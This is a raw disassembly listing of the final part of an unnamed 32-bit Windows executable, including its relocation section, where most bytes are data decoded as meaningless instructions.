  40fbaf:	xacquire xchg DWORD PTR [esi+0x5e],ebx
  40fbb3:	leave  
  40fbb4:	xor    eax,0x472222
  40fbb9:	add    BYTE PTR [eax],al
  40fbbb:	or     al,0x0
  40fbbd:	add    BYTE PTR [eax],al
  40fbbf:	add    DWORD PTR [esp+ebp*2+0x6c],ebp
  40fbc3:	and    al,0xd2
  40fbc5:	rcl    bl,cl
  40fbc7:	imul   ebp
  40fbc9:	in     eax,0xdf
  40fbcb:	jmp    ebx
  40fbcd:	rol    bh,1
  40fbcf:	(bad)  
  40fbd0:	jmp    0xed40ecbd
  40fbd5:	jmp    0xe62afbc3
  40fbda:	loope  0x40fbdb
  40fbdc:	out    0xe2,al
  40fbde:	fcos   
  40fbe0:	out    0xd4,eax
  40fbe2:	mov    ah,0xff
  40fbe4:	loope  0x40fb9f
  40fbe6:	cmp    bh,0xe0
  40fbe9:	mov    cl,0x70
  40fbeb:	push   DWORD PTR [ecx+0x64]
  40fbee:	pusha  
  40fbef:	frstor [edx]
  40fbf1:	push   ds
  40fbf2:	push   ds
  40fbf3:	ja     0x40fbf5
  40fbf5:	add    BYTE PTR [eax],al
  40fbf7:	sbb    eax,0x3000000
  40fbfc:	add    BYTE PTR [eax],al
  40fbfe:	add    BYTE PTR [eax],al
  40fc00:	outs   dx,DWORD PTR ds:[esi]
  40fc01:	outs   dx,DWORD PTR ds:[esi]
  40fc02:	outs   dx,DWORD PTR ds:[esi]
  40fc03:	xor    eax,0xfadedbd8
  40fc08:	fadd   st,st(4)
  40fc0a:	mov    eax,0x7480b5ff
  40fc0f:	push   DWORD PTR [ebx-0x44007f7d]
  40fc15:	lea    ecx,[ebp-0x60613a01]
  40fc1b:	dec    ebx
  40fc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc1e:	stos   BYTE PTR es:[edi],al
  40fc1f:	(bad)  
  40fc20:	fxch   st(4)
  40fc22:	sar    bh,1
  40fc24:	jmp    0xe9e4:0xe2fff8f1
  40fc2b:	jmp    FWORD PTR [ebp+ebp*2+0x6d]
  40fc2f:	fst    DWORD PTR [esi]
  40fc31:	push   ss
  40fc32:	push   ss
  40fc33:	ins    BYTE PTR es:[edi],dx
  40fc34:	add    BYTE PTR [eax],al
  40fc36:	add    BYTE PTR [ecx],bl
  40fc38:	add    BYTE PTR [eax],al
  40fc3a:	add    BYTE PTR [ecx],al
  40fc3c:	add    BYTE PTR [eax],al
  40fc3e:	add    BYTE PTR [eax],al
  40fc40:	mov    eax,ds:0xf476a2a1
  40fc45:	repnz out dx,al
  40fc47:	(bad)  
  40fc48:	cld    
  40fc49:	int    0x93
  40fc4b:	(bad)  
  40fc4c:	std    
  40fc4d:	lds    ecx,FWORD PTR [ebx-0x623b0701]
  40fc53:	push   edx
  40fc55:	mov    ebp,0xb7ecffa0
  40fc5a:	mov    ds:0xa5b0e7ff,eax
  40fc5f:	(bad)  
  40fc60:	in     al,dx
  40fc61:	(bad)  
  40fc62:	sar    bh,0xff
  40fc65:	jmp    0xffee:0xeefeffea
  40fc6c:	push   ebx
  40fc6d:	push   edx
  40fc6e:	push   edx
  40fc6f:	mov    edi,0x67000000
  40fc74:	add    BYTE PTR [eax],al
  40fc76:	add    BYTE PTR [esi],bl
  40fc78:	add    BYTE PTR [eax],al
  40fc7a:	add    BYTE PTR [edx],al
  40fc7c:	add    BYTE PTR [eax],al
  40fc7e:	add    BYTE PTR [eax],al
  40fc80:	test   al,0xa6
  40fc82:	mov    ds:0x92c8f390,eax
  40fc87:	clc    
  40fc88:	sti    
  40fc89:	(bad)  
  40fc8a:	mov    ?,esi
  40fc8c:	dec    ah
  40fc8e:	mov    eax,ds:0xa9ceffff
  40fc93:	(bad)  
  40fc94:	dec    esi
  40fc96:	mov    cl,0xff
  40fc98:	call   eax
  40fc9a:	mov    ebx,0xc7d4ffff
  40fc9f:	dec    ecx
  40fca1:	lods   eax,DWORD PTR ds:[esi]
  40fca2:	stos   BYTE PTR es:[edi],al
  40fca3:	jmp    0xfeff:0xfedbdaec
  40fcaa:	(bad)  
  40fcab:	inc    eax
  40fcad:	rol    al,0xe1
  40fcb0:	sbb    al,0x1c
  40fcb2:	sbb    al,0x43
  40fcb4:	add    BYTE PTR [eax],al
  40fcb6:	add    BYTE PTR [ecx],dl
  40fcb8:	add    BYTE PTR [eax],al
  40fcba:	add    BYTE PTR [ecx],al
  40fcbc:	add    BYTE PTR [eax],al
  40fcbe:	add    BYTE PTR [eax],al
  40fcc0:	mov    BYTE PTR [eax-0x6d68f279],cl
  40fcc6:	mov    esi,DWORD PTR [edx]
  40fcc8:	stos   DWORD PTR es:[edi],eax
  40fcc9:	popf   
  40fcca:	pop    DWORD PTR [edi-0x59]
  40fccd:	call   0x6a8f:0x96a0598f
  40fcd4:	mov    ch,0xa1
  40fcd6:	cdq    
  40fcd7:	jns    0x40fc9b
  40fcd9:	test   eax,0xa8be8fa2
  40fcde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcdf:	scas   al,BYTE PTR es:[edi]
  40fce0:	mov    BYTE PTR [ebx-0x60609c7d],al
  40fce6:	lahf   
  40fce7:	push   0x76b3b3b3
  40fcec:	cwde   
  40fced:	cwde   
  40fcee:	cwde   
  40fcef:	push   esp
  40fcf0:	inc    ebp
  40fcf1:	inc    ebp
  40fcf2:	inc    ebp
  40fcf3:	adc    al,0x0
  40fcf5:	add    BYTE PTR [eax],al
  40fcf7:	add    al,0x0
	...
  40fd01:	add    bh,bh
  40fd03:	add    BYTE PTR [eax],al
  40fd05:	add    BYTE PTR [ebx+0x62],ch
  40fd08:	add    BYTE PTR [eax],al
  40fd0a:	retf   0xff
  40fd0d:	add    cl,ah
  40fd0f:	inc    DWORD PTR [eax]
  40fd11:	add    ah,bl
  40fd13:	inc    DWORD PTR [eax]
  40fd15:	add    dh,dl
  40fd17:	inc    DWORD PTR [eax]
  40fd19:	add    bh,dl
  40fd1b:	inc    DWORD PTR [eax]
  40fd1d:	add    BYTE PTR [edi+0x310000ff],ch
  40fd23:	inc    DWORD PTR [eax]
  40fd25:	add    BYTE PTR ds:0x270000ff,bh
  40fd2b:	inc    DWORD PTR [eax]
  40fd2d:	add    DWORD PTR [eax],eax
  40fd2f:	inc    DWORD PTR [eax]
  40fd31:	add    DWORD PTR [ebp-0x1],edx
  40fd34:	add    BYTE PTR [ecx],al
  40fd36:	(bad)  
  40fd37:	inc    DWORD PTR [eax]
  40fd39:	add    DWORD PTR [ecx-0x4ffcff01],edi
  40fd3f:	inc    DWORD PTR [eax]
  40fd41:	add    BYTE PTR [ecx],al
  40fd43:	add    BYTE PTR [ecx],cl
  40fd45:	add    BYTE PTR [eax],dh
  40fd47:	xor    BYTE PTR [eax],dl
  40fd49:	add    BYTE PTR [ecx],al
  40fd4b:	add    BYTE PTR [eax+eax*1],al
  40fd4e:	push   0x1000006
  40fd53:	add    BYTE PTR [eax],ah
  40fd55:	and    BYTE PTR [eax],dl
  40fd57:	add    BYTE PTR [ecx],al
  40fd59:	add    BYTE PTR [eax+eax*1],al
  40fd5c:	call   0x240fd63
  40fd61:	add    BYTE PTR [eax],dl
  40fd63:	adc    BYTE PTR [eax],dl
  40fd65:	add    BYTE PTR [ecx],al
  40fd67:	add    BYTE PTR [eax+eax*1],al
  40fd6a:	sub    BYTE PTR [ecx],al
  40fd6c:	add    BYTE PTR [eax],al
  40fd6e:	add    eax,DWORD PTR [eax]
  40fd70:	xor    BYTE PTR [eax],dh
  40fd72:	add    BYTE PTR [eax],al
  40fd74:	add    DWORD PTR [eax],eax
  40fd76:	or     BYTE PTR [eax],al
  40fd78:	test   al,0xe
  40fd7a:	add    BYTE PTR [eax],al
  40fd7c:	add    al,0x0
  40fd7e:	and    BYTE PTR [eax],ah
  40fd80:	add    BYTE PTR [eax],al
  40fd82:	add    DWORD PTR [eax],eax
  40fd84:	or     BYTE PTR [eax],al
  40fd86:	test   al,0x8
  40fd88:	add    BYTE PTR [eax],al
  40fd8a:	add    eax,0x101000
  40fd8f:	add    BYTE PTR [ecx],al
  40fd91:	add    BYTE PTR [eax],cl
  40fd93:	add    BYTE PTR [eax+0x5],ch
  40fd96:	add    BYTE PTR [eax],al
  40fd98:	push   es
  40fd99:	add    BYTE PTR [eax],dh
  40fd9b:	xor    BYTE PTR [eax],al
  40fd9d:	add    BYTE PTR [ecx],al
  40fd9f:	add    BYTE PTR [eax],ah
  40fda1:	add    BYTE PTR [eax+0x7000025],ch
  40fda7:	add    BYTE PTR [eax],ah
  40fda9:	and    BYTE PTR [eax],al
  40fdab:	add    BYTE PTR [ecx],al
  40fdad:	add    BYTE PTR [eax],ah
  40fdaf:	add    BYTE PTR [eax+0x8000010],ch
  40fdb5:	add    BYTE PTR [eax],dl
  40fdb7:	adc    BYTE PTR [eax],al
  40fdb9:	add    BYTE PTR [ecx],al
  40fdbb:	add    BYTE PTR [eax],ah
  40fdbd:	add    BYTE PTR [eax+0x4],ch
  40fdc0:	add    BYTE PTR [eax],al
  40fdc2:	or     DWORD PTR [eax],eax
  40fdc4:	add    BYTE PTR [eax],al
  40fdc6:	add    BYTE PTR [eax],al
  40fdc8:	int    0xfe
  40fdca:	int    0xfe
  40fdcc:	rol    BYTE PTR [eax],1
  40fdce:	add    BYTE PTR [eax],al
  40fdd0:	add    BYTE PTR [eax],al
  40fdd2:	add    DWORD PTR [eax],eax
  40fdd4:	add    BYTE PTR [eax],al
  40fdd6:	add    BYTE PTR [eax],al
  40fdd8:	adc    DWORD PTR [eax],eax
  40fdda:	add    BYTE PTR [eax],al
  40fddc:	add    BYTE PTR [eax],al
  40fdde:	add    BYTE PTR [eax],al
  40fde0:	add    al,BYTE PTR [eax]
  40fde2:	add    BYTE PTR [eax],al
  40fde4:	jmp    0x13d8:0x7688373
  40fdeb:	(bad)  
  40fdec:	sbb    BYTE PTR [edi-0x3c991600],bl
  40fdf2:	xchg   DWORD PTR [eax-0x3d303f65],eax
  40fdf8:	icebp  
  40fdf9:	lods   eax,DWORD PTR ds:[esi]
  40fdfa:	dec    edi
  40fdfb:	das    
  40fdfc:	jo     0x40fe70
  40fdfe:	sub    ecx,DWORD PTR [ecx+ecx*8+0xdbe6b5]
	...
  40fe19:	add    BYTE PTR [eax],al
  40fe1b:	add    BYTE PTR [eax+0xe000000],cl
  40fe21:	add    BYTE PTR [eax],al
  40fe23:	add    BYTE PTR [eax+0x10000000],bl
  40fe29:	add    BYTE PTR [eax],al
  40fe2b:	add    BYTE PTR [eax+0xe000000],ch
  40fe31:	add    BYTE PTR [eax],al
  40fe33:	add    BYTE PTR [eax+0x8000000],bh
	...
  40fe41:	add    BYTE PTR [eax],al
  40fe43:	add    al,al
  40fe45:	add    BYTE PTR [eax],al
  40fe47:	add    BYTE PTR [eax+eax*1],cl
  40fe4a:	add    BYTE PTR [eax],al
  40fe4c:	add    BYTE PTR [eax],al
  40fe4e:	add    BYTE PTR [eax],al
  40fe50:	dec    ebp
  40fe51:	add    BYTE PTR [ebp+0x0],dl
  40fe54:	dec    ecx
	...
  40fe5d:	add    BYTE PTR [eax],al
  40fe5f:	add    BYTE PTR [ebx],al
  40fe61:	add    BYTE PTR [eax],al
  40fe63:	add    BYTE PTR [esi],cl
  40fe65:	add    BYTE PTR [eax],al
  40fe67:	add    BYTE PTR [eax],dl
  40fe69:	add    BYTE PTR [eax],al
  40fe6b:	add    BYTE PTR [eax],bl
  40fe6d:	add    BYTE PTR [eax],al
  40fe6f:	add    BYTE PTR [ebp+0x0],cl
  40fe72:	push   ebp
  40fe73:	add    BYTE PTR [ecx+0x0],cl
	...
  40fe7e:	add    BYTE PTR [eax],al
  40fe80:	or     eax,DWORD PTR [eax]
  40fe82:	add    BYTE PTR [eax],al
  40fe84:	adc    BYTE PTR [eax],al
  40fe86:	add    BYTE PTR [eax],al
  40fe88:	add    BYTE PTR gs:[esi+0x0],ch
  40fe8c:	sub    eax,0x53005500
  40fe91:	add    BYTE PTR [eax],al
  40fe93:	add    BYTE PTR [eax],al
  40fe95:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00410000 <.reloc>:
  410000:	add    BYTE PTR [eax],dl
  410002:	add    BYTE PTR [eax],al
  410004:	sbb    al,0x1
  410006:	add    BYTE PTR [eax],al
  410008:	add    al,0x30
  41000a:	or     BYTE PTR [eax],dh
  41000c:	or     al,0x30
  41000e:	adc    BYTE PTR [eax],dh
  410010:	sbb    al,0x30
  410012:	and    BYTE PTR [eax],dh
  410014:	loopne 0x410046
  410016:	in     al,0x30
  410018:	call   0xf071ec4d
  41001d:	xor    ah,dh
  41001f:	xor    ah,dh
  410021:	xor    al,0xf8
  410023:	xor    al,0xfc
  410025:	xor    al,0x0
  410027:	xor    eax,0x35083504
  41002c:	or     al,0x35
  41002e:	adc    BYTE PTR ds:0x35183514,dh
  410034:	sbb    al,0x35
  410036:	and    BYTE PTR ds:0x35283524,dh
  41003c:	sub    al,0x35
  41003e:	xor    BYTE PTR ds:0x35383534,dh
  410044:	inc    eax
  410045:	xor    eax,0x35503548
  41004a:	pop    eax
  41004b:	xor    eax,0x35683560
  410050:	jo     0x410087
  410052:	js     0x410089
  410054:	xor    BYTE PTR ds:0x35903588,0x98
  41005b:	xor    eax,0x35a835a0
  410060:	add    BYTE PTR [esi],dh
  410062:	add    al,0x36
  410064:	or     BYTE PTR [esi],dh
  410066:	or     al,0x36
  410068:	adc    BYTE PTR [esi],dh
  41006a:	adc    al,0x36
  41006c:	sbb    BYTE PTR [esi],dh
  41006e:	sbb    al,0x36
  410070:	and    BYTE PTR [esi],dh
  410072:	and    al,0x36
  410074:	sub    BYTE PTR [esi],dh
  410076:	sub    al,0x36
  410078:	add    al,0x37
  41007a:	or     BYTE PTR [edi],dh
  41007c:	adc    BYTE PTR [edi],dh
  41007e:	sbb    BYTE PTR [edi],dh
  410080:	cmp    al,0x37
  410082:	dec    esp
  410083:	aaa    
  410084:	push   eax
  410085:	aaa    
  410086:	pusha  
  410087:	aaa    
  410088:	fs aaa 
  41008a:	ins    BYTE PTR es:[edi],dx
  41008b:	aaa    
  41008c:	test   BYTE PTR [edi],dh
  41008e:	mov    BYTE PTR [edi],dh
  410090:	mov    al,ds:0xbc37a437
  410095:	aaa    
  410096:	int3   
  410097:	aaa    
  410098:	shl    BYTE PTR [edi],1
  41009a:	call   0xf078ecd6
  41009f:	aaa    
  4100a0:	clc    
  4100a1:	aaa    
  4100a2:	adc    BYTE PTR [eax],bh
  4100a4:	adc    al,0x38
  4100a6:	sbb    al,0x38
  4100a8:	xor    al,0x38
  4100aa:	inc    esp
  4100ab:	cmp    BYTE PTR [eax+0x38],cl
  4100ae:	dec    esp
  4100af:	cmp    BYTE PTR [eax+0x38],ah
  4100b2:	jo     0x4100ec
  4100b4:	je     0x4100ee
  4100b6:	js     0x4100f0
  4100b8:	nop
  4100b9:	cmp    BYTE PTR [eax+edi*1+0x38b038ac],dl
  4100c0:	mov    ah,0x38
  4100c2:	mov    eax,0xd038bc38
  4100c7:	cmp    al,ah
  4100c9:	cmp    ah,ah
  4100cb:	cmp    al,ch
  4100cd:	cmp    ah,ch
  4100cf:	cmp    ah,dh
  4100d1:	cmp    al,bh
  4100d3:	cmp    ah,bh
  4100d5:	cmp    ah,al
  4100d7:	cmp    ecx,ecx
  4100d9:	cmp    ecx,edi
  4100db:	cmp    ebx,esi
  4100dd:	cmp    esp,edi
  4100df:	cmp    esi,eax
  4100e1:	cmp    esi,esi
  4100e3:	cmp    edi,edx
  4100e5:	cmp    eax,DWORD PTR [eax]
  4100e7:	cmp    al,0x16
  4100e9:	cmp    al,0x31
  4100eb:	cmp    al,0x40
  4100ed:	cmp    al,0x47
  4100ef:	cmp    al,0x4d
  4100f1:	cmp    al,0xab
  4100f3:	cmp    al,0xcb
  4100f5:	cmp    al,0xfb
  4100f7:	cmp    al,0x4e
  4100f9:	cmp    eax,0x3d993d5f
  4100fe:	retf   
  4100ff:	cmp    eax,0x3e103e03
  410104:	mov    WORD PTR ds:0x3e94,?
  41010a:	call   0xba3f:0x8a3eb43e
  410111:	aas    
  410112:	iret   
  410113:	aas    
  410114:	jmp    0x3f:0xf93ff03f
  41011b:	add    BYTE PTR [eax],al
  41011d:	and    BYTE PTR [eax],al
  41011f:	add    BYTE PTR [eax+0x0],dh
  410125:	xor    BYTE PTR [eax+esi*1],cl
  410128:	adc    dh,BYTE PTR [eax]
  41012a:	sbb    esi,DWORD PTR [eax]
  41012c:	and    dh,BYTE PTR [eax]
  41012e:	cmp    esi,DWORD PTR [eax]
  410130:	push   ebx
  410131:	xor    BYTE PTR [ebp+0x30],bl
  410134:	enter  0xf130,0x30
  410138:	xor    DWORD PTR cs:[ecx+esi*1-0x3b],ecx
  41013d:	xor    esi,ebx
  41013f:	xor    DWORD PTR [ebx],eax
  410141:	xor    ah,BYTE PTR [edx+esi*1]
  410144:	push   eax
  410145:	xor    dh,BYTE PTR [esi+0x3e330d32]
  41014b:	xor    edx,DWORD PTR [edi+0x33]
  41014e:	push   ss
  41014f:	xor    al,0x6f
  410151:	xor    al,0xa5
  410153:	xor    al,0x1d
  410155:	xor    eax,0x354e352d
  41015a:	mov    bl,0x35
  41015c:	ret    
  41015d:	xor    eax,0x360035e1
  410162:	ss ss ja 0x41019c
  410166:	sahf   
  410167:	ss mov dh,0x36
  41016a:	enter  0x5536,0x37
  41016e:	mov    ?,WORD PTR [edi]
  410170:	shl    DWORD PTR [edi],0x10
  410173:	cmp    BYTE PTR [ecx],ah
  410175:	cmp    BYTE PTR [esi+0x38],al
  410178:	pop    esi
  410179:	cmp    BYTE PTR [eax-0x43c757c8],cl
  41017f:	cmp    al,al
  410181:	cmp    bh,al
  410183:	cmp    dh,cl
  410185:	cmp    bl,bl
  410187:	cmp    ah,ah
  410189:	cmp    bl,ch
  41018b:	cmp    bh,ch
  41018d:	cmp    ch,dh
  41018f:	cmp    cl,bh
  410191:	cmp    bh,bh
  410193:	cmp    BYTE PTR [ebx],al
  410195:	cmp    DWORD PTR [ecx],ecx
  410197:	cmp    DWORD PTR [edx],edx
  410199:	cmp    DWORD PTR [ecx],ebx
  41019b:	cmp    DWORD PTR [edi],ebp
  41019d:	cmp    DWORD PTR [ebx+0x39],ebx
  4101a0:	xchg   esi,eax
  4101a1:	cmp    esi,esp
  4101a3:	cmp    DWORD PTR [eax],eax
  4101a5:	cmp    dl,BYTE PTR [ebx]
  4101a7:	cmp    bl,BYTE PTR [esi]
  4101a9:	cmp    dh,BYTE PTR [eax+0x3a]
  4101ac:	xchg   esp,eax
  4101ad:	cmp    dh,dl
  4101af:	cmp    cl,BYTE PTR [ecx]
  4101b1:	cmp    edi,DWORD PTR [esi]
  4101b3:	cmp    al,0x7a
  4101b5:	cmp    al,0xa6
  4101b7:	cmp    al,0x29
  4101b9:	cmp    eax,0x3dfe3d55
  4101be:	loope  0x4101fe
  4101c0:	inc    esp
  4101c1:	aas    
  4101c2:	mov    WORD PTR [edi],?
  4101c4:	xchg   edi,eax
  4101c5:	aas    
  4101c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101c7:	aas    
  4101c8:	fnstcw WORD PTR [edi]
  4101ca:	add    BYTE PTR [eax],al
  4101cc:	add    BYTE PTR [eax],dh
  4101ce:	add    BYTE PTR [eax],al
  4101d0:	xchg   esp,eax
  4101d1:	add    BYTE PTR [eax],al
  4101d3:	add    BYTE PTR [ecx],cl
  4101d5:	xor    BYTE PTR [edx+0x30],ch
  4101d8:	retf   0xa30
  4101db:	xor    DWORD PTR [edi+0x31],edx
  4101de:	shl    BYTE PTR [ecx],0xd1
  4101e1:	xor    eax,esi
  4101e3:	xor    DWORD PTR [eax],ebp
  4101e5:	xor    cl,BYTE PTR [ecx-0x54cd69ce]
  4101eb:	xor    bl,BYTE PTR [ecx+0x33]
  4101ee:	xor    DWORD PTR [ebx],0x33a93398
  4101f4:	pop    es
  4101f5:	xor    al,0x16
  4101f7:	xor    al,0x1d
  4101f9:	xor    al,0x2b
  4101fb:	xor    al,0xc2
  4101fd:	xor    al,0xc9
  4101ff:	xor    al,0xea
  410201:	xor    al,0xf1
  410203:	xor    al,0xb0
  410205:	xor    eax,0x35e735cf
  41020a:	cmp    BYTE PTR [esi],dh
  41020c:	inc    edi
  41020d:	ss ins BYTE PTR es:[edi],dx
  41020f:	ss jnp 0x410248
  410212:	test   al,0x36
  410214:	mov    ebx,0x97377e36
  410219:	aaa    
  41021a:	retf   0xc537
  41021d:	cmp    BYTE PTR [edx],dh
  41021f:	cmp    DWORD PTR [edi+0x39],ecx
  410222:	mov    WORD PTR [ecx],?
  410224:	mov    al,0x39
  410226:	sub    edi,DWORD PTR [edx]
  410228:	inc    esi
  410229:	cmp    bl,BYTE PTR [edi+0x423b203a]
  41022f:	cmp    esi,DWORD PTR [ebp+0x3b]
  410232:	in     al,dx
  410233:	cmp    edx,DWORD PTR [ecx]
  410235:	cmp    al,0x87
  410237:	cmp    al,0xa3
  410239:	cmp    al,0xf9
  41023b:	cmp    al,0x7a
  41023d:	cmp    eax,0x3dd63d9c
  410242:	sub    eax,0xa33e4f3e
  410247:	ds stc 
  410249:	add    BYTE PTR ds:[edi],bh
  41024c:	(bad)  
  41024e:	sbb    eax,0x673f563f
  410253:	aas    
  410254:	jne    0x410295
  410256:	mov    ah,0x3f
  410258:	ret    
  410259:	aas    
  41025a:	int3   
  41025b:	aas    
  41025c:	fidivr DWORD PTR [edi]
  41025e:	add    BYTE PTR [eax],al
  410260:	add    BYTE PTR [eax+0x0],al
  410263:	add    ah,ah
  410265:	add    DWORD PTR [eax],eax
  410267:	add    BYTE PTR [edx],ah
  410269:	xor    BYTE PTR [esi],ch
  41026b:	xor    BYTE PTR [ecx],bh
  41026d:	xor    BYTE PTR [ebx-0x5fcf68d0],al
  410273:	xor    BYTE PTR [ebp-0x32cf3fd0],ah
  410279:	xor    ah,ah
  41027b:	xor    bl,ch
  41027d:	xor    al,bh
  41027f:	xor    ch,bh
  410281:	xor    BYTE PTR [edx],al
  410283:	xor    DWORD PTR ds:0x37312e31,edx
  410289:	xor    DWORD PTR [eax+0x31],eax
  41028c:	test   BYTE PTR [ecx],dh
  41028e:	lahf   
  41028f:	xor    DWORD PTR [edi-0x34ce3ecf],esi
  410295:	xor    esp,ebx
  410297:	xor    eax,edi
  410299:	xor    DWORD PTR ds:0x2b322532,ecx
  41029f:	xor    dh,BYTE PTR [ecx]
  4102a1:	xor    dh,BYTE PTR [esi]
  4102a3:	xor    bh,BYTE PTR [edx+esi*1]
  4102a6:	inc    esi
  4102a7:	xor    cl,BYTE PTR [edx+esi*1+0x50]
  4102ab:	xor    dl,BYTE PTR [esi+0x32]
  4102ae:	ja     0x4102e2
  4102b0:	xor    BYTE PTR [edx],0xb5
  4102b3:	xor    bh,BYTE PTR [edi-0x27cd30ce]
  4102b9:	xor    dh,bh
  4102bb:	xor    ah,BYTE PTR [ebx+esi*1]
  4102be:	xor    BYTE PTR [ebx],dh
  4102c0:	push   ebp
  4102c1:	xor    esi,DWORD PTR [ecx+0x33]
  4102c4:	ja     0x4102f9
  4102c6:	mov    ebp,0xfd33f533
  4102cb:	xor    eax,DWORD PTR [edx]
  4102cd:	xor    al,0x20
  4102cf:	xor    al,0x25
  4102d1:	xor    al,0x44
  4102d3:	xor    al,0x4f
  4102d5:	xor    al,0x54
  4102d7:	xor    al,0x6b
  4102d9:	xor    al,0x89
  4102db:	xor    al,0x8e
  4102dd:	xor    al,0xa3
  4102df:	xor    al,0xa8
  4102e1:	xor    al,0xc0
  4102e3:	xor    al,0xc7
  4102e5:	xor    al,0xcc
  4102e7:	xor    al,0xe1
  4102e9:	xor    al,0xe6
  4102eb:	xor    al,0xfb
  4102ed:	xor    al,0x0
  4102ef:	xor    eax,0x35303517
  4102f4:	aaa    
  4102f5:	xor    eax,0x3551353c
  4102fa:	push   esi
  4102fb:	xor    eax,0x3570356b
  410300:	jl     0x410337
  410302:	xor    BYTE PTR ds:0x35923589,0x99
  410309:	xor    eax,0x35c835b7
  41030e:	into   
  41030f:	xor    eax,0x35da35d5
  410314:	in     eax,dx
  410315:	xor    eax,0x362f35f2
  41031a:	inc    edi
  41031b:	ss push ebp
  41031d:	ss pop edx
  41031f:	ss push 0xbe36a136
  410325:	or     esi,DWORD PTR ss:[edi]
  410328:	push   ds
  410329:	aaa    
  41032a:	pop    esi
  41032b:	aaa    
  41032c:	jbe    0x410365
  41032e:	pushf  
  41032f:	aaa    
  410330:	test   al,0x37
  410332:	scas   eax,DWORD PTR es:[edi]
  410333:	aaa    
  410334:	mov    ah,0x37
  410336:	mov    ecx,0xc837bf37
  41033b:	aaa    
  41033c:	int    0x37
  41033e:	shl    DWORD PTR [edi],cl
  410340:	fidiv  DWORD PTR [edi]
  410342:	in     al,0x37
  410344:	call   0xfe78fb80
  410349:	aaa    
  41034a:	or     DWORD PTR [eax],edi
  41034c:	adc    al,0x38
  41034e:	sbb    bh,BYTE PTR [eax]
  410350:	and    bh,BYTE PTR [eax]
  410352:	sub    DWORD PTR [eax],edi
  410354:	xor    eax,0x46384038
  410359:	cmp    BYTE PTR [esi+0x38],cl
  41035c:	push   ebp
  41035d:	cmp    BYTE PTR [eax+0x38],dh
  410360:	jle    0x41039a
  410362:	call   0x4038:0xee38ac38
  410369:	cmp    DWORD PTR [esi+0x39],ecx
  41036c:	push   ebx
  41036d:	cmp    DWORD PTR [esi+0x39],esp
  410370:	imul   edi,DWORD PTR [ecx],0xffffff86
  410373:	cmp    DWORD PTR [edi-0x58c66bc7],ecx
  410379:	cmp    DWORD PTR [ecx+edi*1+0x39c939c2],ebp
  410380:	sar    BYTE PTR [ecx],cl
  410382:	xlat   BYTE PTR ds:[ebx]
  410383:	cmp    edx,ebp
  410385:	cmp    edi,ebp
  410387:	cmp    DWORD PTR [edx+edi*1],eax
  41038a:	or     edi,DWORD PTR [edx]
  41038c:	adc    BYTE PTR [edx],bh
  41038e:	pop    ecx
  41038f:	cmp    ah,BYTE PTR [edi+0x3a]
  410392:	outs   dx,DWORD PTR ds:[esi]
  410393:	cmp    bh,BYTE PTR [edx+0x3a]
  410396:	cmp    BYTE PTR [edx],0x93
  410399:	cmp    bl,BYTE PTR [eax-0x4dc553c6]
  41039f:	cmp    al,bl
  4103a1:	cmp    ch,ch
  4103a3:	cmp    bh,al
  4103a5:	cmp    cl,BYTE PTR [edx]
  4103a7:	cmp    edx,DWORD PTR [ebx+edi*1]
  4103aa:	sub    DWORD PTR [ebx],edi
  4103ac:	inc    eax
  4103ad:	cmp    ecx,DWORD PTR [ebx+edi*1+0x69]
  4103b1:	cmp    esi,DWORD PTR [ebx+edi*1-0x5f]
  4103b5:	cmp    esi,DWORD PTR [esi+0x3bf23b]
  4103bb:	cmp    al,0x13
  4103bd:	cmp    al,0x23
  4103bf:	cmp    al,0x59
  4103c1:	cmp    al,0x5f
  4103c3:	cmp    al,0x7b
  4103c5:	cmp    al,0x8c
  4103c7:	cmp    al,0x97
  4103c9:	cmp    al,0x9d
  4103cb:	cmp    al,0xa5
  4103cd:	cmp    al,0xd6
  4103cf:	cmp    al,0xf8
  4103d1:	cmp    al,0x5
  4103d3:	cmp    eax,0x3d323d22
  4103d8:	dec    edx
  4103d9:	cmp    eax,0x3d823d5c
  4103de:	mov    dl,0x3d
  4103e0:	sar    DWORD PTR ds:0x3dd43dc6,0xde
  4103e7:	cmp    eax,0x3e183df2
  4103ec:	and    al,0x3e
  4103ee:	sub    bh,BYTE PTR [esi]
  4103f0:	aaa    
  4103f1:	ds dec ebp
  4103f3:	ds push esi
  4103f5:	ds pusha 
  4103f7:	imul   edi,DWORD PTR ds:[esi],0x3e7f3e73
  4103fe:	test   DWORD PTR [esi],edi
  410400:	mov    WORD PTR [esi],?
  410402:	xchg   ebp,eax
  410403:	ds fwait
  410405:	mov    ds:0xb63ea93e,eax
  41040b:	ds mov esi,0xe13ec43e
  410411:	ds out 0x3e,al
  410414:	in     al,dx
  410415:	ds icebp 
  410417:	idiv   BYTE PTR ds:[esi]
  41041a:	sti    
  41041b:	add    BYTE PTR ds:[edi],bh
  41041e:	push   es
  41041f:	aas    
  410420:	push   cs
  410421:	aas    
  410422:	sbb    edi,DWORD PTR [edi]
  410424:	xor    bh,BYTE PTR [edi]
  410426:	dec    edi
  410427:	aas    
  410428:	addr16 aas 
  41042a:	jle    0x41046b
  41042c:	xchg   BYTE PTR [edi],bh
  41042e:	(bad)  
  41042f:	aas    
  410430:	xchg   esp,eax
  410431:	aas    
  410432:	cdq    
  410433:	aas    
  410434:	scas   eax,DWORD PTR es:[edi]
  410435:	aas    
  410436:	mov    ch,0x3f
  410438:	mov    esp,0xce3fc13f
  41043d:	aas    
  41043e:	fnstsw WORD PTR [edi]
  410440:	in     eax,0x3f
  410442:	in     eax,dx
  410443:	aas    
  410444:	add    BYTE PTR [eax+0x0],dl
  410447:	add    BYTE PTR [ecx+eax*1+0x0],dh
  41044b:	add    BYTE PTR [ebx],al
  41044d:	xor    BYTE PTR [ebx],cl
  41044f:	xor    BYTE PTR [edx],dl
  410451:	xor    BYTE PTR [ebx+0x30],ah
  410454:	ins    DWORD PTR es:[edi],dx
  410455:	xor    BYTE PTR [ebx+0x30],dh
  410458:	jge    0x41048a
  41045a:	mov    ch,0x30
  41045c:	mov    ebx,0xcb30c530
  410461:	xor    ah,dl
  410463:	xor    cl,bl
  410465:	xor    BYTE PTR [ebx],cl
  410467:	xor    DWORD PTR [esi],ebp
  410469:	xor    DWORD PTR [edx+0x31],esi
  41046c:	mov    BYTE PTR [ecx],dh
  41046e:	xchg   esi,eax
  41046f:	xor    DWORD PTR [edi-0x3ace50cf],esp
  410475:	xor    ebp,ecx
  410477:	xor    ecx,esi
